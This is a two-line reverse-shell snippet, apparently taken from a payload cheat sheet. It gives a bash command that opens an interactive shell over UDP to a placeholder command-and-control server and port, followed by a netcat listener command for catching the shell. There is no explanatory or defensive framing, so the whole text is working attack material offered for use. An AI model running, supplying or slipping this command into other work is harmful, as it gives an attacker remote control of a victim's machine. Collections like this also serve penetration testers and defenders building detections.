sh -i >& /dev/udp/XX_CC_SERVER_IP/XX_PORT 0>&1

Listener:
nc -u -lvp XX_PORT
